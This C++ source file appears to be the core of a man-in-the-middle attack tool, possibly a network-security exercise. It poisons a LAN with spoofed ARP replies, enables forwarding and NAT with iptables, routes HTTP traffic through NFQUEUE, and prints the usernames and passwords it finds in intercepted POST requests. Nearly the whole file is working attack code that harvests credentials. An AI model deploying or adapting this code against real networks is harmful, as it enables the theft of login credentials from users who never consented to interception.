#include "mitm_attack.hpp"

// #define INFO 1

void handle_sigint(int sig) {
    system("iptables -F");
    system("iptables -F -t nat");
    system("sysctl net.ipv4.ip_forward=0 > /dev/null");
    exit(0);
}

void setup_forwarding(const char *interface) {
    char command[100];

    // Enable IP forwarding
    system("sysctl net.ipv4.ip_forward=1 > /dev/null");

    // Flush existing rules
    system("iptables -F");
    system("iptables -F -t nat");

    // Setup masquerade for outgoing packets on the specified interface
    sprintf(command, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
    system(command);

    // Forward HTTP packets to NFQUEUE
    sprintf(command, "iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE");
    system(command);
}

// Parse the POST HTTP packet and print the username and password
void printUsernameAndPassword(uint8_t *payload, int payload_length) {
    // Find the username and password
    char *username_start = strstr((char *)payload, "Username=");
    char *password_start = strstr((char *)payload, "Password=");
    if (username_start && password_start) {
        char *username_end = strchr(username_start, '&');
        char *password_end = (char *)payload + payload_length;

        if (!username_end) {
            username_end = password_start - 1;
        }

        // Print the username and password
        printf("\nUsername: ");
        for (char *p = username_start + strlen("Username="); p < username_end; p++) {
            printf("%c", *p);
        }
        printf("\nPassword: ");
        for (char *p = password_start + strlen("Password="); p < password_end; p++) {
            printf("%c", *p);
        }
        printf("\n");
    }
}


static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                           struct nfq_data *nfa, void *data) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw *hwph;
    u_int32_t id = 0;
    struct NFQData *nfq_data = (struct NFQData *)data;

    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }
    unsigned char *packet;
    int len = nfq_get_payload(nfa, &packet);
    if (len < 0) {
        printf("Error: nfq_get_payload returned %d\n", len);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    // ip header
    struct iphdr *iph = (struct iphdr *)packet;
    int iph_len = iph->ihl * 4;
    // tcp header
    struct tcphdr *tcph = (struct tcphdr *)(packet + iph_len);
    int tcph_len = tcph->doff * 4;

    // Check whether the packet is a HTTP packet
    if (iph->protocol != IPPROTO_TCP || tcph->dest != htons(80)) {
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    // Check whether the packet is a POST packet
    if (memcmp(packet + iph_len + tcph_len, "POST", 4) == 0) {
        // Dump the HTTP packet's payload
        // for (int i = iph_len + tcph_len; i < len; i++) {
        //     printf("%c", packet[i]);
        // }

        // Parse the POST packet and print the username and password
        printUsernameAndPassword(packet + iph_len + tcph_len, len - iph_len - tcph_len);

        // Reset payload
        memset(packet + iph_len + tcph_len, 0, len - iph_len - tcph_len);
    }

    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int sd;
    int rv;
    char buf[4096] __attribute__((aligned));

    struct NFQData nfq_data;
    nfq_data.local_info = local_info;
    nfq_data.ip_mac_pairs = ip_mac_pairs;

    h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &handleNFQPacket, &nfq_data);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }
    sd = nfq_fd(h);
    while ((rv = recv(sd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    getSourceIP(interface, local_info.src_ip);

    // Get source MAC address.
    getMACAddress(interface, local_info.src_mac);

    // Get netmask.
    getMask(interface, local_info.netmask);

    // Get default gateway.
    getDefaultGateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Start the threads
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
    std::thread receive_thread(receiveARPReply, sd, std::ref(ip_mac_pairs), local_info);

    signal(SIGINT, handle_sigint);

    // Setup IP forwarding
    setup_forwarding(interface);

    // Start the NFQHandler
    NFQHandler(local_info, ip_mac_pairs);

    // Wait for threads to finish
    send_thread.join();
    receive_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}